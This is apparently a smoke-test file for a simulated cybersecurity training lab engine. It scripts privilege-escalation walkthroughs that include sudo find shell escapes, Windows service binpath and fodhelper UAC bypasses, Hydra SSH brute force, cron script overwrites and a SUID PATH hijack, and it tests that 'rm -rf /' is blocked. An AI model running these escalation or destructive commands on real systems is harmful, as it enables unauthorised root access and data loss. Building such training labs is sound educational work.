const assert = require('assert');
process.env.SESSION_SECRET = 'ctfuz-arena-test-secret-32-chars-minimum';
const { LABS, executeLabCommand, expectedFlag } = require('../services/arenaLabEngine');

function run(slug, commands) {
  const lab = LABS[slug];
  let state = {
    connected: false, elevated: false, serviceConfigured: false,
    uacDefaultConfigured: false, uacDelegateConfigured: false,
    enumerated: false, exploitPrepared: false, cwd: '/home/trainee',
    objectivesCompleted: [false, false, false, false]
  };
  const results = [];
  for (const command of commands) {
    const result = executeLabCommand(lab, 'smoke-session-001', state, command);
    state = result.state;
    results.push(result);
  }
  return { state, results };
}

const linux = run('linux-privesc', [
  'ssh trainee@10.10.10.10', 'pwd', 'sudo -l', 'cd /usr/bin', 'pwd',
  'sudo find . -exec /bin/sh -p \\;', 'whoami', 'id', 'cat /root/root.txt'
]);
assert.strictEqual(linux.state.elevated, true, 'Linux find sudo scenario should elevate');
assert.strictEqual(linux.state.cwd, '/root', 'Linux working directory should persist in state');
assert.ok(linux.results.at(-1).output.startsWith('CTFUZ{'), 'Linux root flag should be readable after elevation');
assert.deepStrictEqual(linux.state.objectivesCompleted.slice(0, 3), [true, true, true]);
const afterExit = executeLabCommand(LABS['linux-privesc'], 'smoke-session-001', linux.state, 'exit');
assert.strictEqual(afterExit.state.connected, false, 'exit should close target shell');
assert.strictEqual(afterExit.state.objectivesCompleted[2], true, 'exit should not erase completed lab objectives');

const windows = run('windows-privesc', [
  'xfreerdp /v:10.10.20.10 /u:trainee', 'whoami /all', 'sc qc vulnsvc',
  'icacls "c:\\program files\\vulnsvc\\service.exe"',
  'sc config vulnsvc binpath= "C:\\Windows\\System32\\cmd.exe /c whoami"',
  'sc start vulnsvc', 'type c:\\programdata\\root.txt'
]);
assert.strictEqual(windows.state.elevated, true, 'Windows service scenario should elevate');
assert.ok(windows.results.at(-1).output.startsWith('CTFUZ{'), 'Windows root flag should be readable');
assert.strictEqual(windows.results[1].output.includes('PRIVILEGES INFORMATION'), true);
assert.strictEqual(windows.results[2].state.serviceInspected, true, 'sc qc must persist service inspection');
assert.strictEqual(windows.results[3].state.aclInspected, true, 'icacls must persist ACL inspection');
const windowsConnected = executeLabCommand(LABS['windows-privesc'], 'smoke-session-002', { connected: false, cwd: '/home/trainee', objectivesCompleted: [false, false, false, false] }, 'xfreerdp /v:10.10.20.10 /u:trainee').state;
const winCd = executeLabCommand(LABS['windows-privesc'], 'smoke-session-002', windowsConnected, 'cd desktop');
assert.strictEqual(winCd.state.cwd, 'C:\\Users\\trainee\\Desktop', 'Windows case-insensitive cd should navigate to Desktop');
assert.ok(executeLabCommand(LABS['windows-privesc'], 'smoke-session-002', winCd.state, 'dir').output.includes('readme.txt'));
const winBack = executeLabCommand(LABS['windows-privesc'], 'smoke-session-002', winCd.state, 'cd ..');
assert.strictEqual(winBack.state.cwd, 'C:\\Users\\trainee');
const winD = executeLabCommand(LABS['windows-privesc'], 'smoke-session-002', winBack.state, 'cd /d C:\\Program Files\\VulnSvc');
assert.strictEqual(winD.state.cwd, 'C:\\Program Files\\VulnSvc', 'cd /d must support an absolute Windows path with spaces');
const winHelp = executeLabCommand(LABS['windows-privesc'], 'smoke-session-001', windows.state, 'help');
assert.ok(winHelp.output.includes('Windows CMD'), 'help should switch to Windows command list after RDP');
assert.ok(executeLabCommand(LABS['windows-privesc'], 'smoke-session-001', windows.state, 'sc qc').output.includes('sc qc VulnSvc'));
assert.ok(executeLabCommand(LABS['windows-privesc'], 'smoke-session-001', windows.state, 'ip route').output.includes('ipconfig'));


const uac = run('uac-bypass', [
  'xfreerdp /v:10.10.30.10 /u:trainee', 'whoami /groups',
  'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d cmd.exe /f',
  'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f',
  'start fodhelper.exe', 'type c:\\users\\administrator\\desktop\\flag.txt'
]);
assert.strictEqual(uac.state.elevated, true, 'UAC simulation should elevate');
assert.ok(uac.results.at(-1).output.startsWith('CTFUZ{'), 'UAC flag should be readable');
assert.ok(uac.results[2].state.objectivesCompleted[2] === false, 'UAC setup objective must wait for both registry values');
assert.ok(uac.results[3].state.objectivesCompleted[2] === true, 'UAC setup objective completes after both values');

const blocked = run('linux-privesc', ['ssh trainee@10.10.10.10', 'rm -rf /']);
assert.match(blocked.results.at(-1).output, /qo‘llab-quvvatlanmaydi/);
assert.strictEqual(expectedFlag('smoke-session-001', 'linux-privesc').startsWith('CTFUZ{'), true);

console.log('Arena Labs engine smoke tests: PASS (Linux, Windows CMD dialect, path navigation, service/ACL workflow, UAC, restricted command handling).');

// CodeNest Linux PrivEsc: Kali discovery -> SSH brute-force -> student ->
// devuser lateral movement -> three independent, isolated root paths.
const codenestBase = [
  'nmap 192.168.56.0/24',
  'nmap -p22 -sV 192.168.56.101',
  'hydra -l student -P rockyou.txt ssh://192.168.56.101',
  'ssh student@192.168.56.101',
  'whoami',
  'find / -iname "Flag1.txt" 2>/dev/null',
  'cat /home/student/.config/system/.cache/tmp/.hidden/Flag1.txt',
  'ls -la /opt/codenest',
  'cat /opt/codenest/backup.sh',
  'su devuser',
  'D3vUser_B@ckup2024',
  'whoami',
  'cat /opt/codenest/Flag2.txt'
];
const codenest = run('codenest-linux-privesc', [
  ...codenestBase,
  'sudo -l',
  'sudo find . -exec /bin/sh \\; -quit',
  'whoami',
  'cat /root/Flag3.txt'
]);
assert.ok(codenest.results[0].output.includes('192.168.56.101'), 'subnet scan must discover the Ubuntu target');
assert.ok(codenest.results[1].output.includes('22/tcp open  ssh'), 'service scan must show only SSH open');
assert.ok(codenest.results[2].output.includes('password: princess1'), 'Hydra simulation must find the lab student password');
assert.ok(codenest.results[5].output.includes('/home/student/.config/system/.cache/tmp/.hidden/Flag1.txt'), 'find must locate Flag1');
assert.ok(codenest.results[8].output.includes('DEVUSER_PASS='), 'backup script must expose the intentional credential');
assert.strictEqual(codenest.results[9].prompt, 'Password:', 'su must use a password prompt');
assert.strictEqual(codenest.state.codenest.currentUser, 'root', 'sudo find route must reach root');
assert.strictEqual(codenest.state.codenest.rootVia, 'sudo-find');
assert.ok(codenest.results.at(-1).output.includes('CTFUZ{codenest_linux_privesc_'), 'CodeNest root flag must be dynamic and readable');
assert.deepStrictEqual(codenest.state.objectivesCompleted, [true, true, true, true]);

const codenestCron = run('codenest-linux-privesc', [
  ...codenestBase,
  'cat /etc/cron.d/codenest-cleanup',
  'ls -la /opt/codenest/cleanup.sh',
  "echo 'chmod +s /bin/bash' > /opt/codenest/cleanup.sh",
  'sleep 120',
  'bash -p',
  'whoami',
  'cat /root/Flag3.txt'
]);
assert.ok(codenestCron.results[14].output.includes('-rw-rw-rw-'), 'cleanup.sh must expose the required 0666 mode');
assert.strictEqual(codenestCron.state.codenest.cronPayloadInstalled, true, 'devuser can replace the world-writable cron script');
assert.strictEqual(codenestCron.state.codenest.cronTriggered, true, 'virtual cron must tick after 120 simulated seconds');
assert.strictEqual(codenestCron.state.codenest.rootVia, 'cron');
assert.strictEqual(codenestCron.results.at(-1).output, 'Tabriklaymiz! Siz root huquqini oldingiz va stsenariyni muvaffaqiyatli yakunladingiz.\n' + expectedFlag('smoke-session-001', 'codenest-linux-privesc'));

const codenestSuid = run('codenest-linux-privesc', [
  ...codenestBase,
  'find / -perm -4000 2>/dev/null',
  'cat /opt/codenest/backup_tool.c',
  'mkdir -p /tmp/hijack',
  "echo '/bin/chmod +s /bin/bash' > /tmp/hijack/chmod",
  'chmod +x /tmp/hijack/chmod',
  'export PATH=/tmp/hijack:$PATH',
  '/usr/local/bin/backup_tool',
  'bash -p',
  'whoami',
  'cat /root/Flag3.txt'
]);
assert.strictEqual(codenestSuid.state.codenest.suidInspected, true, 'SUID inventory must include the custom tool');
assert.ok(codenestSuid.results[13].output.includes('/usr/local/bin/backup_tool'), 'SUID inventory must expose backup_tool');
assert.strictEqual(codenestSuid.state.codenest.pathHijackActive, true, 'PATH hijack must be prepared in the virtual filesystem');
assert.strictEqual(codenestSuid.state.codenest.rootVia, 'suid-path');
assert.ok(codenestSuid.results.at(-1).output.includes('CTFUZ{codenest_linux_privesc_'), 'SUID route must read the root flag');

const blockedCodenest = run('codenest-linux-privesc', ['nmap 192.168.56.0/24', 'rm -rf /']);
assert.match(blockedCodenest.results.at(-1).output, /command not found|unsupported/i, 'unlisted commands must not execute on the host');
assert.strictEqual(LABS['codenest-linux-privesc'].difficulty, 'Intermediate');
assert.ok(LABS['codenest-linux-privesc'].objectives.length === 4);

console.log('CodeNest Linux PrivEsc smoke tests: PASS (Nmap, Hydra, SSH, lateral movement, Flag1/2, sudo find, cron, SUID PATH hijack, root flag, host isolation).');

const deniedRootFlag = run('codenest-linux-privesc', [
  'nmap 192.168.56.0/24', 'nmap -p22 -sV 192.168.56.101',
  'hydra -l student -P rockyou.txt ssh://192.168.56.101',
  'ssh student@192.168.56.101', 'cat /root/Flag3.txt'
]);
assert.match(deniedRootFlag.results.at(-1).output, /Permission denied/, 'root flag must remain unreadable before escalation');

const badSuPassword = run('codenest-linux-privesc', [
  ...codenestBase.slice(0, 10), 'not-the-password'
]);
assert.strictEqual(badSuPassword.state.codenest.currentUser, 'student', 'wrong su password must not grant devuser');
assert.strictEqual(badSuPassword.state.codenest.devuserAuthenticated, false);
